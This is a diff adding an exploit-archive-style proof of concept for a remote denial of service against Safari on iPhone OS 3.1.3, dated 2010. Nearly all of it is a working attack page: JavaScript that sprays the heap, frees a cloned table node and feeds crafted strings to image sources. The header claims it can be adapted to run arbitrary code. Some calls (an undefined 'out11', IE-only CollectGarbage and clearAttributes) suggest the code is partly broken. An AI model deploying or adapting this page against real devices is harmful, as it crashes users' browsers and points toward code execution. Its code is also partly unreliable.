@@ -1,0 +1,53 @@
+# Exploit Title: Remote DoS on Safari for iPhone & iPod Touch
+
+# Date: 26/03/2010
+
+# Author: Nishant Das Patnaik
+# For more of Nishant's research, please visit:
+# http://nishantdaspatnaik.yolasite.com/research.php
+
+# Tested on: iPod Touch 3G (iPhone OS 3.1.3)
+
+# Description: An attacker may direct the user to visit a specially crafted webpage that can lead the Safari browser on iPhone & iPod Touch running iPhone OS 3.1.3 to freeze and finally crash. The attacker can modify to the PoC to run arbitrary code on the device.
+ 
+# Code:
+
+---------PoC STARTS HERE----------------
+
+<html>
+<title> Remote DoS on Safari for iPhone & iPod Touch </title>
+<body>
+<script language="JavaScript">
+var size="%u03e8";
+var matrix = new Array();
+var slope = 0x100000-(size.length*2+0x01020);
+var bomb = unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
+while(bomb.length<slope/2) { bomb+=bomb;}
+var lh = bomb.substring(0,slope/2);
+delete bomb;
+for(i=0; i<0xC0; i++) {
+matrix[i] = lh + size;
+}
+CollectGarbage();
+var slope1=unescape("%u0b0b%u0b0b%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000AAAAAAAAAAAAAAAAAAAAAAAAA");
+var matrix1 = new Array();
+for(var x=0;x<1000;x++) matrix1.push(document.createElement("img"));
+function ready() {
+out1=document.createElement("tbody");
+out1.click;
+var out2 = out1.cloneNode(); 
+out11.clearAttributes();
+out1=null; CollectGarbage();
+for(var x=0;x<matrix1.length;x++) matrix1[x].src=slope1;
+out2.click;
+}
+</script>
+<script>window.setTimeout("ready();",800);</script>
+<center>
+<h1> Remote DoS on Safari for iPhone & iPod Touch </h1>
+<h2> (C) Nishant Das Patnaik </h2>
+</center>
+</body>
+</html>
+
+---------POC ENDS HERE----------------
